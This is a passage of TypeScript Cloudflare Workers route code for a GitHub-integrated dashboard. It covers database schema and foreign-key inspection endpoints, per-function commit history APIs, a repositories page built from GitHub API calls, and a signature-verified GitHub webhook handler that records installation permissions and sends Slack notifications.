    const stats = computeColumnRelationStats(tables, relations);
    const html = renderColumnStatsHtml({
      stats,
      totalTables: tables.length,
      totalRelations: relations.length,
      generatedAt: new Date().toISOString(),
    });

    return new Response(html, {
      status: 200,
      headers: { 'Content-Type': 'text/html; charset=utf-8' },
    });
  } catch (error) {
    logger.warn('Failed to render column-stats', {
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return new Response('Failed to render column-stats', {
      status: 500,
      headers: { 'Content-Type': 'text/plain; charset=utf-8' },
    });
  }
});

app.get('/function-changelog', authMiddleware, async (c) => {
  const db = c.env.DB;
  if (!db) {
    return new Response('DB not available', { status: 500, headers: { 'Content-Type': 'text/plain; charset=utf-8' } });
  }

  try {
    const repoIdParam = c.req.query('repo');
    const selectedRepoId = repoIdParam ? parseInt(repoIdParam, 10) : null;

    const reposResult = await db.prepare(
      `SELECT id, full_name FROM ts_repository ORDER BY id`
    ).all<{ id: number; full_name: string }>();
    const repos = reposResult.results ?? [];

    let rows: FunctionChangeRow[] = [];
    let availableFiles: string[] = [];
    let availableFunctions: { file_path: string; function_name: string; purpose: string }[] = [];

    if (selectedRepoId !== null && !isNaN(selectedRepoId)) {
      const [rowResult, fileResult, funcResult] = await Promise.all([
        db.prepare(`
          SELECT
            cl.commit_at, cl.commit_hash, cl.subject,
            m.file_path, m.function_name,
            COALESCE(f.purpose, '') AS purpose,
            m.change_type, m.lines_added, m.lines_deleted,
            i.impact_type, i.severity, i.contribution, i.notes,
            r.full_name AS repo_full_name
          FROM ts_commit_function_map m
          JOIN ts_commit_log cl ON m.repo_id = cl.repo_id AND m.commit_hash = cl.commit_hash
          JOIN ts_repository r ON m.repo_id = r.id
          LEFT JOIN ts_function_catalog f
                 ON m.repo_id = f.repo_id AND m.file_path = f.file_path AND m.function_name = f.function_name
          LEFT JOIN ts_function_impact i
                 ON m.repo_id = i.repo_id AND m.commit_hash = i.commit_hash
                AND m.file_path = i.file_path AND m.function_name = i.function_name
          WHERE m.repo_id = ?
          ORDER BY cl.commit_at DESC, m.file_path, m.function_name
          LIMIT 1000
        `).bind(selectedRepoId).all<FunctionChangeRow>(),
        db.prepare(
          `SELECT DISTINCT file_path FROM ts_function_catalog WHERE repo_id = ? ORDER BY file_path`
        ).bind(selectedRepoId).all<{ file_path: string }>(),
        db.prepare(
          `SELECT file_path, function_name, COALESCE(purpose,'') AS purpose FROM ts_function_catalog WHERE repo_id = ? ORDER BY file_path, function_name`
        ).bind(selectedRepoId).all<{ file_path: string; function_name: string; purpose: string }>(),
      ]);
      rows = rowResult.results ?? [];
      availableFiles = (fileResult.results ?? []).map(r => r.file_path);
      availableFunctions = funcResult.results ?? [];
    }

    const html = getFunctionChangelogPage({
      rows,
      repos,
      selectedRepoId,
      availableFiles,
      availableFunctions,
      generatedAt: new Date().toISOString(),
    });

    return new Response(html, { status: 200, headers: { 'Content-Type': 'text/html; charset=utf-8' } });
  } catch (error) {
    logger.warn('Failed to render function-changelog', {
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return new Response('Failed to render function-changelog', { status: 500, headers: { 'Content-Type': 'text/plain; charset=utf-8' } });
  }
});

/**
 * 関数ファイル変更履歴 API
 * GET /api/function-file-history?repo_id=X&function_name=Y&file_path=Z
 * ts_commit_function_map JOIN ts_commit_log からその関数のファイルに触れたコミット一覧を返す。
 */
app.get('/api/function-file-history', authMiddleware, async (c) => {
  const db = c.env.DB;
  if (!db) return c.json({ ok: false, error: 'DB not available' }, 500);

  const repoIdStr    = c.req.query('repo_id');
  const functionName = c.req.query('function_name');
  const filePath     = c.req.query('file_path');

  if (!repoIdStr || !functionName || !filePath) {
    return c.json({ ok: false, error: 'repo_id, function_name, file_path は必須です' }, 400);
  }
  const repoId = parseInt(repoIdStr, 10);
  if (isNaN(repoId)) return c.json({ ok: false, error: 'repo_id は整数でなければなりません' }, 400);

  try {
    const result = await db.prepare(`
      SELECT
        m.commit_hash, cl.commit_at, cl.subject, cl.author_email,
        cl.branch_name, cl.files_changed,
        m.change_type, m.lines_added, m.lines_deleted
      FROM ts_commit_function_map m
      JOIN ts_commit_log cl ON m.repo_id = cl.repo_id AND m.commit_hash = cl.commit_hash
      WHERE m.repo_id = ? AND m.file_path = ? AND m.function_name = ?
      ORDER BY cl.commit_at DESC
      LIMIT 200
    `).bind(repoId, filePath, functionName).all<{
      commit_hash: string; commit_at: string; subject: string;
      author_email: string | null; branch_name: string | null;
      files_changed: number | null;
      change_type: string; lines_added: number; lines_deleted: number;
    }>();

    const commits = result.results ?? [];
    return c.json({
      ok: true,
      repo_id: repoId,
      function_name: functionName,
      file_path: filePath,
      commits,
      total: commits.length,
    });
  } catch (error) {
    logger.warn('function-file-history error', { error: error instanceof Error ? error.message : String(error) });
    return c.json({ ok: false, error: 'DB query failed' }, 500);
  }
});

/**
 * 関数ソース取得 API
 * GET /api/function-source?repo_id=X&function_name=Y&file_path=Z
 * ts_function_catalog から purpose と source_snippet を返す。
 * source_snippet カラムが未追加の場合は null を返し github_url でフォールバック。
 */
app.get('/api/function-source', authMiddleware, async (c) => {
  const db = c.env.DB;
  if (!db) return c.json({ ok: false, error: 'DB not available' }, 500);

  const repoIdStr    = c.req.query('repo_id');
  const functionName = c.req.query('function_name');
  const filePath     = c.req.query('file_path');

  if (!repoIdStr || !functionName || !filePath) {
    return c.json({ ok: false, error: 'repo_id, function_name, file_path は必須です' }, 400);
  }
  const repoId = parseInt(repoIdStr, 10);
  if (isNaN(repoId)) return c.json({ ok: false, error: 'repo_id は整数でなければなりません' }, 400);

  try {
    const repoResult = await db.prepare(
      `SELECT full_name FROM ts_repository WHERE id = ?`
    ).bind(repoId).first<{ full_name: string }>();

    const repoFullName = repoResult?.full_name ?? null;
    const githubUrl = repoFullName && filePath
      ? `https://github.com/${repoFullName}/blob/main/${filePath}`
      : null;

    let purpose = '';
    let sourceSnippet: string | null = null;

    try {
      const row = await db.prepare(
        `SELECT COALESCE(purpose,'') AS purpose, source_snippet FROM ts_function_catalog
         WHERE repo_id = ? AND file_path = ? AND function_name = ? LIMIT 1`
      ).bind(repoId, filePath, functionName).first<{ purpose: string; source_snippet: string | null }>();
      purpose = row?.purpose ?? '';
      sourceSnippet = row?.source_snippet ?? null;
    } catch {
      const row = await db.prepare(
        `SELECT COALESCE(purpose,'') AS purpose FROM ts_function_catalog
         WHERE repo_id = ? AND file_path = ? AND function_name = ? LIMIT 1`
      ).bind(repoId, filePath, functionName).first<{ purpose: string }>();
      purpose = row?.purpose ?? '';
      sourceSnippet = null;
    }

    return c.json({
      ok: true,
      repo_id: repoId,
      file_path: filePath,
      function_name: functionName,
      purpose,
      source_snippet: sourceSnippet,
      github_url: githubUrl,
    });
  } catch (error) {
    logger.warn('function-source error', { error: error instanceof Error ? error.message : String(error) });
    return c.json({ ok: false, error: 'DB query failed' }, 500);
  }
});

/**
 * カラム別「物理FK検証」API
 * /status/column-stats の「検証する」ボタンから呼び出され、各カラムに注釈を返す。
 *
 * missing > 0 のカラムがあっても仕様上は許容できる（論理FK のみ、技術カラム、意図的な未マップ等）
 * ことを判定するのが目的。
 */
app.get('/api/status/column-stats/verify', authMiddleware, async (c) => {
  const db = c.env.DB;
  if (!db) {
    return jsonUtf8({ error: 'DB not available' }, 500);
  }
  try {
    const { tables, physicalRelations, logicalRelations } = await loadSchemaRelations(db);
    const stats = computeColumnRelationStats(tables, [...physicalRelations, ...logicalRelations]);
    const verifications = verifyColumnStats(stats, physicalRelations, logicalRelations);
    return jsonUtf8({
      generatedAt: new Date().toISOString(),
      totalTables: tables.length,
      physicalRelationCount: physicalRelations.length,
      logicalRelationCount: logicalRelations.length,
      columns: verifications,
    });
  } catch (error) {
    logger.warn('Failed to verify column-stats', {
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return jsonUtf8({ error: 'Failed to verify column-stats' }, 500);
  }
});

app.get('/api/status/tables/:table/migration-details', authMiddleware, async (c) => {
  const tableName = c.req.param('table');
  const tableDefinition = getStatusTableDefinition(tableName);

  if (!tableDefinition) {
    return jsonUtf8({ error: 'Table not found' }, 404);
  }

  const queryExample = getStatusTableQueryExample(tableName);
  const sql = STATUS_MIGRATION_SQL[tableDefinition.migration];

  return jsonUtf8({
    table: tableName,
    migration: tableDefinition.migration,
    description: tableDefinition.description,
    migrationSql: sql ?? '',
    queryExample,
    endpoints: {
      tableRowsPath: `/api/status/tables/${encodeURIComponent(tableName)}/rows`,
      migrationSqlPath: `/api/status/migrations/${encodeURIComponent(tableDefinition.migration)}/sql`,
      migrationDetailPath: `/api/status/tables/${encodeURIComponent(tableName)}/migration-details`,
    },
  });
});

app.get('/api/status/tables/:table/group-er', authMiddleware, async (c) => {
  const db = c.env.DB;
  const tableName = c.req.param('table');

  const tableDescriptions: Record<string, string> = {};
  for (const tbl of getEffectiveStatusTableDefinitions()) {
    tableDescriptions[tbl.name] = tbl.description;
  }

  let groupMap: Record<string, string> = { ...TABLE_GROUP_MAP };
  let fkTargets = COLUMN_FK_TARGETS;
  const pragmaColumnsMap: Record<string, string[]> = {};

  if (db) {
    try {
      const catalogRows = await db.prepare('SELECT table_name, group_name, description FROM table_catalog').all<{
        table_name: string; group_name: string; description: string;
      }>();
      if (catalogRows.results && catalogRows.results.length > 0) {
        for (const row of catalogRows.results) {
          groupMap[row.table_name] = row.group_name;
          tableDescriptions[row.table_name] = row.description;
        }
      }
    } catch {
      // table_catalog未作成 — フォールバック定数を使用
    }

    try {
      const keyRows = await db.prepare('SELECT table_name, column_name, fk_target_table FROM table_column_keys WHERE fk_target_table IS NOT NULL').all<{
        table_name: string; column_name: string; fk_target_table: string;
      }>();
      fkTargets = mergeFkTargetsFromDb(fkTargets, keyRows.results ?? []);
    } catch {
      // table_column_keys未作成 — フォールバック定数を使用
    }

    // table_catalog の投入状況に依存せず commit_agent_log のグループ解決を保証
    if (!groupMap.commit_agent_log) {
      groupMap.commit_agent_log = 'ai';
    }

    const groupName = groupMap[tableName];
    if (groupName) {
      const groupTables = Object.entries(groupMap).filter(([, g]) => g === groupName).map(([t]) => t);
      for (const t of groupTables) {
        try {
          const pragma = await db.prepare(`PRAGMA table_info(${t})`).all<{ name: string }>();
          pragmaColumnsMap[t] = (pragma.results ?? []).map((col) => col.name);
        } catch {
          pragmaColumnsMap[t] = [];
        }
      }
    }
  }

  const erData = buildGroupErData(tableName, groupMap, tableDescriptions, TABLE_COLUMN_KEYS, fkTargets, pragmaColumnsMap);
  if (!erData) {
    return jsonUtf8({ error: 'Group not found for table' }, 404);
  }
  return jsonUtf8(erData);
});

/**
 * FK検証: リレーションの実データをサンプリングして返す
 */
app.post('/api/status/fk-verify', authMiddleware, async (c) => {
  const db = c.env.DB;
  if (!db) return jsonUtf8({ error: 'DB not available' }, 500);

  const body = await c.req.json<{ fromTable: string; fromCol: string; toTable: string; toCol: string }>();
  const { fromTable, fromCol, toTable, toCol } = body;

  const tableNamePattern = /^[a-z_][a-z0-9_]*$/;
  if (!tableNamePattern.test(fromTable) || !tableNamePattern.test(toTable) || !tableNamePattern.test(fromCol) || !tableNamePattern.test(toCol)) {
    return jsonUtf8({ error: 'Invalid table/column name' }, 400);
  }

  try {
    const joinSql = `SELECT f.${fromCol} AS fk_value, f.rowid AS from_rowid, t.rowid AS to_rowid FROM ${fromTable} f INNER JOIN ${toTable} t ON f.${fromCol} = t.${toCol} ORDER BY RANDOM() LIMIT 5`;
    const joinResult = await db.prepare(joinSql).all<{ fk_value: string; from_rowid: number; to_rowid: number }>();
    const matched = joinResult.results ?? [];

    const orphanSql = `SELECT f.${fromCol} AS fk_value FROM ${fromTable} f LEFT JOIN ${toTable} t ON f.${fromCol} = t.${toCol} WHERE t.${toCol} IS NULL LIMIT 5`;
    const orphanResult = await db.prepare(orphanSql).all<{ fk_value: string }>();
    const orphans = orphanResult.results ?? [];

    const countSql = `SELECT COUNT(*) AS total FROM ${fromTable}`;
    const countResult = await db.prepare(countSql).first<{ total: number }>();
    const totalFrom = countResult?.total ?? 0;

    const orphanCountSql = `SELECT COUNT(*) AS total FROM ${fromTable} f LEFT JOIN ${toTable} t ON f.${fromCol} = t.${toCol} WHERE t.${toCol} IS NULL`;
    const orphanCountResult = await db.prepare(orphanCountSql).first<{ total: number }>();
    const orphanCount = orphanCountResult?.total ?? 0;

    const samples: { fromRow: Record<string, unknown>; toRow: Record<string, unknown> }[] = [];
    for (const m of matched) {
      const fromRowSql = `SELECT * FROM ${fromTable} WHERE rowid = ? LIMIT 1`;
      const toRowSql = `SELECT * FROM ${toTable} WHERE rowid = ? LIMIT 1`;
      const [fromRow, toRow] = await Promise.all([
        db.prepare(fromRowSql).bind(m.from_rowid).first(),
        db.prepare(toRowSql).bind(m.to_rowid).first(),
      ]);
      if (fromRow && toRow) {
        samples.push({ fromRow: fromRow as Record<string, unknown>, toRow: toRow as Record<string, unknown> });
      }
    }

    return jsonUtf8({
      relation: { fromTable, fromCol, toTable, toCol },
      totalFromRows: totalFrom,
      orphanCount,
      orphanSamples: orphans.map((o) => o.fk_value),
      samples,
    });
  } catch (err) {
    return jsonUtf8({ error: err instanceof Error ? err.message : 'Query failed' }, 500);
  }
});

/**
 * リポジトリページ（ログインが必要だが未ログイン時はトップへ）
 */
app.get('/repositories', optionalAuthMiddleware, async (c) => {
  const user = c.get('user');

  if (!user) {
    return c.redirect('/', 302);
  }

  const commitHistoryPageSize = resolveCommitHistoryPageSize(c.env.COMMIT_HISTORY_PAGE_SIZE);
  const userSession = await getUserSession(c.env.DB, user.sub);
  const accessToken = userSession?.githubAccessToken ?? user.github_access_token ?? undefined;

  const cookieHeader = c.req.header('Cookie');
  const timezone = userSession?.timezone || getCookieValues(cookieHeader, ['user_timezone'])['user_timezone'] || DEFAULT_TIMEZONE;

  let repositories: {
    owner: string;
    name: string;
    htmlUrl: string;
    description?: string | null;
    language?: string | null;
    stars: number;
    forks: number;
    updatedAt: string;
    isPrivate: boolean;
    latestCommitSha?: string | null;
    latestCommitUrl?: string | null;
  }[] = [];
  let errorMessage: string | null = null;

  // トークンのスコープを取得
  let grantedScopes: string[] | null = null;
  const clientId = c.env.GITHUB_CLIENT_ID;
  const clientSecret = c.env.GITHUB_CLIENT_SECRET;
  if (accessToken && clientId && clientSecret) {
    try {
      grantedScopes = await getGitHubTokenScopes({ accessToken, clientId, clientSecret });
    } catch (error) {
      logger.warn('Failed to fetch GitHub token scopes', {
        userId: user.sub,
        error: error instanceof Error ? error.message : 'Unknown error',
      });
    }
  }

  // GitHub App インストール権限をリポジトリごとに取得（D1優先、APIフォールバック）
  let repoInstallationPermissions: Map<string, RepoInstallationPermissions> = new Map();
  const d1Perms = await getInstallationPermissionsFromD1(c.env.DB);
  if (d1Perms) {
    // D1 のデータをMap形式に変換
    for (const [repoName, info] of Object.entries(d1Perms.permissions)) {
      repoInstallationPermissions.set(repoName, {
        installationId: 0,
        permissions: info.permissions,
        repositorySelection: info.repositorySelection as 'all' | 'selected',
      });
    }
    if (d1Perms.allPermissions) {
      repoInstallationPermissions.set('__all__0', {
        installationId: 0,
        permissions: d1Perms.allPermissions,
        repositorySelection: 'all',
      });
    }
  } else if (accessToken) {
    try {
      repoInstallationPermissions = await buildRepoInstallationPermissionsMap(accessToken);
    } catch (error) {
      logger.warn('Failed to fetch installation permissions from GitHub API', {
        userId: user.sub,
        error: error instanceof Error ? error.message : 'Unknown error',
      });
    }
  }

  try {
    let repos = await getGitHubUserRepos({ username: user.sub, accessToken });
    repositories = await Promise.all(repos.map(async (repo) => {
      const updatedAt = repo.updated_at
        ? formatTimestampWithTimezone(new Date(repo.updated_at), timezone)
        : '不明';
      const owner = repo.owner?.login || (repo.full_name ? repo.full_name.split('/')[0] : user.sub);
      const latestCommit = owner
        ? await getGitHubLatestCommit({ owner, repo: repo.name, accessToken })
        : null;
      return {
        owner,
        name: repo.name,
        htmlUrl: repo.html_url,
        description: repo.description,
        language: repo.language,
        stars: repo.stargazers_count ?? 0,
        forks: repo.forks_count ?? 0,
        updatedAt,
        isPrivate: repo.private,
        latestCommitSha: latestCommit?.sha ?? null,
        latestCommitUrl: latestCommit?.html_url ?? null,
      };
    }));
  } catch (error) {
    const primaryError = error instanceof Error ? error.message : 'Unknown error';
    logger.error('Failed to fetch GitHub repositories (primary)', {
      userId: user.sub,
      error: primaryError,
    });
    if (accessToken) {
      try {
        const repos = await getGitHubUserRepos({ username: user.sub });
        repositories = await Promise.all(repos.map(async (repo) => {
          const updatedAt = repo.updated_at
            ? formatTimestampWithTimezone(new Date(repo.updated_at), timezone)
            : '不明';
          const owner = repo.owner?.login || (repo.full_name ? repo.full_name.split('/')[0] : user.sub);
          const latestCommit = owner
            ? await getGitHubLatestCommit({ owner, repo: repo.name })
            : null;
          return {
            owner,
            name: repo.name,
            htmlUrl: repo.html_url,
            description: repo.description,
            language: repo.language,
            stars: repo.stargazers_count ?? 0,
            forks: repo.forks_count ?? 0,
            updatedAt,
            isPrivate: repo.private,
            latestCommitSha: latestCommit?.sha ?? null,
            latestCommitUrl: latestCommit?.html_url ?? null,
          };
        }));
      } catch (fallbackError) {
        const fallbackMsg = fallbackError instanceof Error ? fallbackError.message : 'Unknown error';
        logger.error('Failed to fetch GitHub repositories (fallback)', {
          userId: user.sub,
          error: fallbackMsg,
        });
        errorMessage = `リポジトリ一覧を取得できませんでした（${primaryError}）。再ログインをお試しください。`;
      }
    } else {
      errorMessage = `リポジトリ一覧を取得できませんでした（${primaryError}）。再ログインをお試しください。`;
    }
  }

  // リポジトリごとのインストール権限をシリアライズ可能な形に変換
  // "__all__" キーを持つインストールがある場合は、全リポジトリにその権限を適用
  const repoPermissionsMap: Record<string, { permissions: Record<string, string>; repositorySelection: string }> = {};
  let allReposPermissions: Record<string, string> | null = null;
  for (const [key, value] of repoInstallationPermissions.entries()) {
    if (key.startsWith('__all__')) {
      allReposPermissions = value.permissions;
    } else {
      repoPermissionsMap[key] = {
        permissions: value.permissions,
        repositorySelection: value.repositorySelection,
      };
    }
  }
  // "All repositories" インストールがある場合、全リポジトリにその権限を適用
  if (allReposPermissions) {
    for (const repo of repositories) {
      if (!repoPermissionsMap[repo.name]) {
        repoPermissionsMap[repo.name] = {
          permissions: allReposPermissions,
          repositorySelection: 'all',
        };
      }
    }
  }

  // 外部サービス連携判定
  let cloudflareLinkedRepos: Set<string> = new Set();
  let vercelLinkedRepos: Set<string> = new Set();
  let slackLinkedRepos: Set<string> = new Set();
  if (accessToken) {
    try {
      const repoNames = repositories.map((r) => r.name);
      const [externalResult, slackResult] = await Promise.all([
        getExternalServiceLinkedRepos(accessToken),
        getSlackLinkedReposByWebhooks(accessToken, user.sub, repoNames),
      ]);
      cloudflareLinkedRepos = externalResult.cloudflare.repos;
      vercelLinkedRepos = externalResult.vercel.repos;
      slackLinkedRepos = slackResult;
    } catch (error) {
      logger.warn('Failed to detect external service linked repos', {
        userId: user.sub,
        error: error instanceof Error ? error.message : 'Unknown error',
      });
    }
  }

  // リポジトリ名のセットをシリアライズ可能な形に変換
  const cloudflareRepos: Record<string, boolean> = {};
  const vercelRepos: Record<string, boolean> = {};
  const slackRepos: Record<string, boolean> = {};
  for (const repoName of cloudflareLinkedRepos) {
    cloudflareRepos[repoName] = true;
  }
  for (const repoName of vercelLinkedRepos) {
    vercelRepos[repoName] = true;
  }
  for (const repoName of slackLinkedRepos) {
    slackRepos[repoName] = true;
  }

  // Cloudflare セットアップ通知を取得
  let cloudflareSetupPending: Array<{
    id: number;
    repoOwner: string;
    repoName: string;
    repoFullName: string;
    isPrivate: boolean;
    createdAt: string;
  }> = [];
  if (c.env.DB) {
    try {
      const pendingRows = await c.env.DB.prepare(`
        SELECT id, repo_owner, repo_name, repo_full_name, is_private, created_at
        FROM cloudflare_setup_pending
        WHERE user_id = ? AND dismissed_at IS NULL
        ORDER BY created_at DESC
        LIMIT 10
      `).bind(user.sub).all<{
        id: number;
        repo_owner: string;
        repo_name: string;
        repo_full_name: string;
        is_private: number;
        created_at: string;
      }>();

      // Cloudflare 連携済みのリポジトリは除外
      cloudflareSetupPending = (pendingRows.results ?? [])
        .filter((row) => !cloudflareRepos[row.repo_name])
        .map((row) => ({
          id: row.id,
          repoOwner: row.repo_owner,
          repoName: row.repo_name,
          repoFullName: row.repo_full_name,
          isPrivate: row.is_private === 1,
          createdAt: row.created_at,
        }));
    } catch (error) {
      logger.warn('Failed to fetch Cloudflare setup pending notifications', {
        userId: user.sub,
        error: error instanceof Error ? error.message : 'Unknown error',
      });
    }
  }

  return c.html(getRepositoriesPage({
    username: user.sub,
    name: user.name,
    repositories,
    errorMessage,
    grantedScopes,
    repoPermissions: repoPermissionsMap,
    cloudflareLinkedRepos: Object.keys(cloudflareRepos).length > 0 ? cloudflareRepos : null,
    vercelLinkedRepos: Object.keys(vercelRepos).length > 0 ? vercelRepos : null,
    slackLinkedRepos: Object.keys(slackRepos).length > 0 ? slackRepos : null,
    commitHistoryPageSize,
    cloudflareSetupPending,
  }));
});

// =====================================================
// Webhook エンドポイント
// =====================================================

/**
 * GitHub App Webhook 受信用エンドポイント
 * installation イベントを受信し、D1 に権限を保存、Slack に通知
 */

async function fetchLatestPrCommitInfo(commitsUrl: string, githubToken: string): Promise<{ sha: string; message: string; authorName: string | null; authorEmail: string | null } | null> {
  const res = await fetch(commitsUrl, {
    headers: {
      Authorization: `Bearer ${githubToken}`,
      Accept: 'application/vnd.github+json',
      'User-Agent': 'cloudflare-workers-github-oauth-1',
    },
  });
  if (!res.ok) {
    const body = await res.text().catch(() => '');
    throw new Error(`PR commits fetch failed: ${res.status} ${res.statusText} ${body.slice(0, 500)}`);
  }
  const commits = await res.json() as Array<{ sha?: string; commit?: { message?: string; author?: { name?: string; email?: string } } }>;
  if (!Array.isArray(commits) || commits.length === 0) {
    return null;
  }
  const latest = commits[commits.length - 1];
  const message = typeof latest?.commit?.message === 'string' ? latest.commit.message : '';
  if (!message) return null;
  return {
    sha: latest?.sha ?? '',
    message,
    authorName: latest?.commit?.author?.name ?? null,
    authorEmail: latest?.commit?.author?.email ?? null,
  };
}

app.post('/webhook/github', async (c) => {
  const webhookSecret = c.env.GITHUB_WEBHOOK_SECRET;
  if (!webhookSecret) {
    logger.error('GitHub webhook secret is not configured');
    return c.json({ error: 'Webhook endpoint is not available' }, 500);
  }

  const rawBody = await c.req.text();
  const signatureHeader = c.req.header('X-Hub-Signature-256');

  const verification = await verifyGitHubWebhookSignature(rawBody, signatureHeader, webhookSecret);
  if (!verification.success) {
    logger.warn('Rejected GitHub webhook', {
      reason: verification.reason,
      path: c.req.path,
    });
    return c.json({ error: 'Unauthorized webhook' }, 401);
  }

  const eventType = c.req.header('X-GitHub-Event') ?? 'unknown';
  const deliveryId = c.req.header('X-GitHub-Delivery') ?? 'unknown';

  let payload: GitHubWebhookInstallationPayload;
  try {
    payload = rawBody ? JSON.parse(rawBody) : {};
  } catch {
    return c.json({ error: 'Invalid webhook payload' }, 400);
  }

  const action = typeof payload?.action === 'string' ? payload.action : 'unknown';

  logger.info('GitHub webhook received', { eventType, action, deliveryId });

  // installation イベントを処理
  if (eventType === 'installation' || eventType === 'installation_repositories') {
    const db = c.env.DB;
    const installation = payload?.installation;

    if (installation && typeof installation.id === 'number' && db) {
      const installationId = installation.id;
      const permissions = installation.permissions ?? {};
      const repositorySelection = installation.repository_selection ?? 'selected';
      const now = new Date().toISOString();

      try {
        if (action === 'deleted' || action === 'suspend') {
          // インストール削除 or 一時停止 → D1 から該当レコードを削除
          await db.prepare(
            'DELETE FROM installation_permissions WHERE installation_id = ?'
          ).bind(installationId).run();

          logger.info('Deleted installation permissions from D1', { installationId, action });
        } else if (action === 'created' || action === 'new_permissions_accepted' || action === 'unsuspend') {
          // インストール作成 or 権限承認 or 再開
          if (repositorySelection === 'all') {
            // "All repositories" → repo_name を NULL で1レコード
            await db.prepare(`
              INSERT INTO installation_permissions (installation_id, repo_name, repository_selection, permissions, updated_at)
              VALUES (?, NULL, ?, ?, ?)
              ON CONFLICT(installation_id, repo_name) DO UPDATE SET
                repository_selection = excluded.repository_selection,
                permissions = excluded.permissions,
                updated_at = excluded.updated_at
            `).bind(installationId, repositorySelection, JSON.stringify(permissions), now).run();
          } else {
            // "Selected repositories" → リポジトリごとにレコード
            const repos = payload?.repositories ?? payload?.repositories_added ?? [];
            if (Array.isArray(repos)) {
              for (const repo of repos) {
                const repoName = repo.name ?? repo.full_name?.split('/').pop();
                if (!repoName) continue;
                await db.prepare(`
                  INSERT INTO installation_permissions (installation_id, repo_name, repository_selection, permissions, updated_at)
                  VALUES (?, ?, ?, ?, ?)
                  ON CONFLICT(installation_id, repo_name) DO UPDATE SET
                    repository_selection = excluded.repository_selection,
                    permissions = excluded.permissions,
                    updated_at = excluded.updated_at
                `).bind(installationId, repoName, repositorySelection, JSON.stringify(permissions), now).run();
              }
            }
          }

          // repositories_removed があれば削除
          const removedRepos = payload?.repositories_removed ?? [];
          if (Array.isArray(removedRepos)) {
            for (const repo of removedRepos) {
              const repoName = repo.name ?? repo.full_name?.split('/').pop();
              if (!repoName) continue;
              await db.prepare(
                'DELETE FROM installation_permissions WHERE installation_id = ? AND repo_name = ?'
              ).bind(installationId, repoName).run();
            }
          }

          logger.info('Updated installation permissions in D1', {
            installationId,
            action,
            repositorySelection,
            permissionKeys: Object.keys(permissions),
          });
        }
      } catch (error) {
        logger.error('Failed to update installation permissions in D1', {
          installationId,
          action,
          error: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }

    // Slack 通知: GitHub App インストール変更
    const slackToken = c.env.SLACK_OAUTH_TOKEN;
    const slackChannel = c.env.SLACK_CHANNEL_ID;
    if (slackToken && slackChannel) {
      const sender = payload?.sender?.login ?? 'unknown';
      const appSlug = installation?.app_slug ?? 'unknown';
      const actionMessage: Record<string, string> = {
        created: 'インストールされました',
        deleted: 'アンインストールされました',
        suspend: '一時停止されました',
        unsuspend: '再開されました',
        new_permissions_accepted: 'パーミッション変更が承認されました',
      };
      const message = actionMessage[action] ?? `${action}が実行されました`;
      const repoSelection = installation?.repository_selection ?? 'unknown';

      const slackText = [
        `GitHub OAuth App で${message}`,
        `対象App: ${appSlug}`,
        `管理者: ${sender}`,
        `対象: ${repoSelection === 'all' ? '全リポジトリ' : '選択リポジトリ'}`,
      ].join('\n');

      try {
        await postSlackMessage({ token: slackToken, channel: slackChannel, text: slackText });
      } catch (error) {
        logger.error('Slack notification failed for GitHub webhook', {
          error: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  }

  // repository イベント: リポジトリ作成時に Cloudflare セットアップ通知を保存
  if (eventType === 'repository' && action === 'created') {
    const db = c.env.DB;
    const repoPayload = payload as unknown as GitHubWebhookRepositoryPayload;
    const repo = repoPayload?.repository;
    const senderLogin = repoPayload?.sender?.login;

    if (db && repo && senderLogin) {
      const now = new Date().toISOString();
      try {
        await db.prepare(`
          INSERT INTO cloudflare_setup_pending (user_id, repo_owner, repo_name, repo_full_name, is_private, created_at)
          VALUES (?, ?, ?, ?, ?, ?)
          ON CONFLICT(user_id, repo_full_name) DO NOTHING
        `).bind(
          senderLogin,
          repo.owner?.login ?? senderLogin,
          repo.name,
          repo.full_name,
          repo.private ? 1 : 0,
          now,
        ).run();

        logger.info('Saved Cloudflare setup pending notification (webhook)', {
          userId: senderLogin,
          repoFullName: repo.full_name,
        });
      } catch (error) {
        logger.error('Failed to save Cloudflare setup pending notification', {
          error: error instanceof Error ? error.message : 'Unknown error',
          repoFullName: repo.full_name,
        });
      }
    }
  }

  // pull_request イベント: AI要約 → Slack通知
  if (eventType === 'pull_request') {
    const prPayload = payload as unknown as GitHubWebhookPullRequestPayload;
    const prAction = prPayload?.action;
    if (prAction === 'opened' || prAction === 'synchronize') {
      const pr = prPayload?.pull_request;
      const repoFullName = prPayload?.repository?.full_name ?? 'unknown';
      const slackToken = c.env.SLACK_OAUTH_TOKEN;
      const slackChannel = c.env.SLACK_CHANNEL_ID;
      const ai = c.env.AI;
      const githubToken = c.env.GITHUB_TOKEN;

      if (!pr) {
        logger.warn('pull_request payload is missing pr object', { repoFullName });
      } else if (!slackToken) {
        logger.warn('SLACK_OAUTH_TOKEN is not configured, skipping PR notification', { repoFullName });
      } else if (!slackChannel) {
        logger.warn('SLACK_CHANNEL_ID is not configured, skipping PR notification', { repoFullName });
      }
      if (pr && slackToken && slackChannel) {
        const db = c.env.DB;
        const title = pr.title;
        const description = pr.body ?? '';
        const prUrl = pr.html_url;
        const prNumber = pr.number;
        const author = pr.user?.login ?? 'unknown';
        const now = new Date();
        const eventDate = now.toISOString().slice(0, 10); // YYYY-MM-DD
        const requestId = crypto.randomUUID();
        const aiModel = resolveAiModel(c.env.AI_MODEL);

        // 本日の通算番号を取得
        let dailySeq = 1;
        if (db) {
          try {
            const countResult = await db.prepare(
              'SELECT COUNT(*) as cnt FROM ai_summary_log WHERE event_date = ?'
            ).bind(eventDate).first<{ cnt: number }>();
            dailySeq = (countResult?.cnt ?? 0) + 1;
          } catch (error) {
            logger.warn('Failed to get daily AI summary count', {
              error: error instanceof Error ? error.message : 'Unknown error',
            });
          }
        }

        // diff 取得（GITHUB_TOKEN がある場合のみ）
        let trimmedDiff = '';
        let diffLength = 0;
        if (!githubToken) {
          logger.warn('GITHUB_TOKEN is not configured, skipping PR diff fetch', { prUrl });
        } else if (!pr.diff_url) {
          logger.warn('PR diff_url is missing', { prUrl });
        } else {
          try {
            const diffResult = await fetchPrDiff({ diffUrl: pr.diff_url, githubToken });
            trimmedDiff = diffResult.trimmedDiff;
            diffLength = diffResult.diffLength;
            logger.info('Fetched PR diff', { prUrl, diffLength, trimmedLength: trimmedDiff.length });
          } catch (error) {
            logger.warn('Failed to fetch PR diff', {
              error: error instanceof Error ? error.message : 'Unknown error',
